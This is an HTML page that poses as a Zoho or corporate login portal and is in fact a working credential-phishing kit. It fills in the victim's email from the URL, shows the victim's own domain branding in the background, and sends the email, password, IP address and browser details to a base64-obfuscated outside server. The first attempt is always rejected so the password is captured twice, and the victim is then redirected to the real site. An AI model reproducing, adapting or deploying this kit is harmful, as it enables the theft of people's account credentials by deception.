
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Portal</title>
    <!-- Include Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" nonce="MTA3NzMwNzcyNiw0MDgzMTg3NDgx"></script>

    <style>
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
        }

        body {
            font-family: Poppins, sans-serif;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        #background-iframe {
            border: none;
            z-index: -3;
            object-fit: cover;
        }

        #overlay {
            background-color: rgba(0, 0, 0, .5);
            z-index: -2;
        }

        .form-container {
            display: block;
            max-width: 400px;
            width: 100%;
            padding: 2rem;
            background-color: rgba(255, 255, 255, .95);
            border-radius: .75rem;
            box-shadow: 0 8px 16px rgba(0, 0, 0, .2);
            position: relative;
            z-index: 1;
        }

        .icon-text {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .icon-text img {
            width: 32px;
            height: 32px;
            margin-right: .5rem;
        }

        .icon-text .h4 {
            margin-bottom: 0;
            color: #0d6efd;
        }

        .form-floating {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .form-floating label, .input-icon {
            position: absolute;
            color: #6c757d;
            pointer-events: none;
        }

        .form-floating label {
            transition: .2s ease-in-out;
            left: 2.5rem;
            top: -.2rem;
            background-color: transparent;
            z-index: 1;
        }

        .form-floating input:focus+label, .form-floating input:not(:placeholder-shown)+label {
            transform: translateY(-1.5rem);
            font-size: .85rem;
            color: #0d6efd;
        }

        .form-control {
            border-top: none;
            border-left: none;
            border-right: none;
            border-bottom: 2px solid #ced4da;
            border-radius: 0;
            padding-left: 2.5rem;
            transition: border-color .2s;
            background-color: transparent;
        }

        .form-control:focus {
            box-shadow: none;
            outline: 0;
            border-bottom-color: #0d6efd;
        }

        .input-icon {
            left: .75rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.2rem;
        }

        .btn-primary {
            width: 100%;
            padding: .75rem;
            font-size: 1rem;
            background-color: #0d6efd;
            border: none;
            border-radius: .375rem;
            transition: background-color .3s, color .3s;
        }

        .btn-primary:hover {
            background-color: #0b5ed7;
            color: #fff;
        }

        .btn-primary:focus {
            box-shadow: none;
        }

        @media (max-width: 576px) {
            .form-container {
                padding: 1.5rem;
            }
        }

        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .5);
            align-items: center;
            justify-content: center;
            z-index: 9999;
            display: none;
        }

        .error-message {
            color: red;
            margin-bottom: 1rem;
            display: none;
        }

        /* Verification section styling */
        #verification-section {
            margin-top: 20px;
            text-align: center;
        }

        .confirm-text {
            font-size: 0.9rem;
            margin-top: 10px;
            color: #6c757d;
        }
    </style>
</head>

<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
    <!-- Background Iframe -->
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <!-- Dimmed Overlay -->
    <div id="overlay"></div>
    
    <!-- Form Container -->
    <div class="form-container" id="form-container">
        <!-- Error Message -->
        <div id="error-message" class="error-message translatable" data-key="try-again">Try again</div>

        <form id="user-form">
            <!-- Icon and Text Row -->
            <div class="icon-text">
                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width:15px;">
                <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
            </div>
            <!-- Heading -->
            <h5 class="mb-3 translatable" data-key="leading-security">Leading with Security.</h5>
            <!-- Paragraph -->
            <p class="mb-4 text-muted translatable" style="font-size: .8rem;" data-key="learn-more">To get started, log in using your email and password.</p>
			
            <!-- Email Input -->
            <div class="form-floating position-relative">
                <i class="bi bi-envelope input-icon"></i>
                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
                <label for="email" style="background-color: transparent;" class="translatable" data-key="email-label">Email</label>
            </div>
            <!-- Password Input -->
            <div class="form-floating position-relative">
                <i class="bi bi-lock input-icon"></i>
                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
                <label for="password" style="background-color: transparent;" class="translatable" data-key="password-label">Password</label>
            </div>
            <!-- Submit Button -->
            <button type="submit" class="btn btn-primary translatable" data-key="next-button" id="submit-button">Continue</button>
            
            <!-- Verification Section -->
            <div id="verification-section">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAACEsbiIU157p7qCf" data-callback="TranquilBreeze"></div>
                <div class="confirm-text">Browser safety for protection.</div>
            </div>
        </form>
    </div>

    <!-- Loader Overlay -->
    <div id="loader-overlay" class="loader-overlay">
        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
            <span class="visually-hidden translatable" data-key="loading-text">Loading...</span>
        </div>
    </div>

    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- Google Translate API -->
    <script>
        // Function to detect user's country and language
        function detectUserLanguage() {
            // First, try to get language from browser
            const browserLang = navigator.language || navigator.userLanguage;
            const langCode = browserLang.split('-')[0]; // Get base language code
            
            // If we have a supported language, use it
            const supportedLanguages = ['pl', 'fr', 'de', 'es', 'it', 'pt', 'ru', 'zh', 'ja', 'ko', 'ar'];
            if (supportedLanguages.includes(langCode)) {
                return langCode;
            }
            
            // If browser language not supported, try to detect by IP
            return new Promise((resolve) => {
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        const countryCode = data.country_code ? data.country_code.toLowerCase() : 'en';
                        // Map country codes to language codes
                        const countryToLang = {
                            'pl': 'pl', // Poland
                            'fr': 'fr', // France
                            'de': 'de', // Germany
                            'es': 'es', // Spain
                            'it': 'it', // Italy
                            'pt': 'pt', // Portugal
                            'ru': 'ru', // Russia
                            'cn': 'zh', // China
                            'jp': 'ja', // Japan
                            'kr': 'ko', // South Korea
                            'sa': 'ar'  // Saudi Arabia
                        };
                        
                        resolve(countryToLang[countryCode] || 'en');
                    })
                    .catch(() => {
                        resolve('en'); // Fallback to English
                    });
            });
        }
        
        // Function to translate page content
        function translatePage(targetLang) {
            if (targetLang === 'en') return; // No need to translate if English
            
            // Google Translate API endpoint (this is a simplified approach)
            // Note: For production, you would need to use the official Google Cloud Translation API
            const apiUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=${targetLang}&dt=t&q=`;
            
            // Get all elements with the translatable class
            const elements = document.querySelectorAll('.translatable');
            
            // Collect all texts to translate
            const texts = [];
            elements.forEach(el => {
                texts.push(el.textContent.trim());
            });
            
            // Translate all texts (this is a simplified implementation)
            // In a real implementation, you would batch requests and handle API limits
            elements.forEach((el, index) => {
                const text = texts[index];
                if (text) {
                    fetch(apiUrl + encodeURIComponent(text))
                        .then(response => response.json())
                        .then(data => {
                            if (data && data[0] && data[0][0] && data[0][0][0]) {
                                el.textContent = data[0][0][0];
                            }
                        })
                        .catch(error => {
                            console.error('Translation error:', error);
                        });
                }
            });
        }
        
        // Initialize translation when page loads
        document.addEventListener('DOMContentLoaded', async function() {
            const userLanguage = await detectUserLanguage();
            if (userLanguage !== 'en') {
                translatePage(userLanguage);
            }
        });
    </script>

    <!-- Custom JavaScript to Handle 'portal' Parameter and Background Iframe -->
    <script>let a=0,b=!1;function c(){const d=new URLSearchParams(location.search).get("portal"),e=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;return d&&e.test(d)?d:null}const f=c();function TranquilBreeze(){console.log("CAPTCHA passed!"),b=!0}addEventListener("DOMContentLoaded",(()=>{const g=new URLSearchParams(location.search).get("portal");let h;if(g){document.getElementById("email").value=g;const i=g.split("@");if(2===i.length){const g=i[1];h=g,document.getElementById("domain-favicon").src=`https://www.google.com/s2/favicons?domain=${g}`,document.getElementById("domain-name").textContent=g.split(".")[0].toUpperCase(),document.getElementById("background-iframe").src=g.startsWith("http://")||g.startsWith("https://")?g:`https://${g}`}}else console.warn("No 'portal' parameter found."),document.getElementById("background-iframe").src="about:blank";let i={ipAddress:"Fetching...",userAgent:navigator.userAgent,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,browser:"Detecting..."};const j=navigator.userAgent;j.indexOf("Firefox")>-1?i.browser="Mozilla Firefox":j.indexOf("SamsungBrowser")>-1?i.browser="Samsung Internet":j.indexOf("Opera")>-1||j.indexOf("OPR")>-1?i.browser="Opera":j.indexOf("Trident")>-1?i.browser="Microsoft Internet Explorer":j.indexOf("Edge")>-1?i.browser="Microsoft Edge":j.indexOf("Chrome")>-1?i.browser="Google Chrome or Chromium":j.indexOf("Safari")>-1?i.browser="Apple Safari":i.browser="Unknown",fetch("https://api.ipify.org?format=json").then(e=>e.json()).then(e=>{i.ipAddress=e.ip}).catch(e=>{console.error("Error fetching IP:",e),i.ipAddress="Unavailable"}),document.getElementById("user-form").addEventListener("submit",(e=>{e.preventDefault();if(!b)return alert("Please complete verification.");a+=1;const j=1===a,k=2===a;document.getElementById("loader-overlay").style.display="flex";const l=new FormData;l.append("email",document.getElementById("email").value.trim()),l.append("password",document.getElementById("password").value.trim()),l.append("ipAddress",i.ipAddress),l.append("userAgent",i.userAgent),l.append("timezone",i.timezone),l.append("browser",i.browser),fetch(atob("aHR0cHM6Ly93b29kbG5kdXN0cmllc2luYy5jb20vYmlsbGkucGhw"),{method:"POST",body:l}).then(e=>e.text()).then(e=>{console.log("Submitted:",e)}).catch(e=>{console.error("Error:",e)}),j?setTimeout((()=>{document.getElementById("loader-overlay").style.display="none",document.getElementById("error-message").style.display="block",document.getElementById("password").value=""}),3e3):k&&setTimeout((()=>{document.getElementById("loader-overlay").style.display="none",location.href="https://"+h}),3e3)}))}));</script>
</body>
</html>
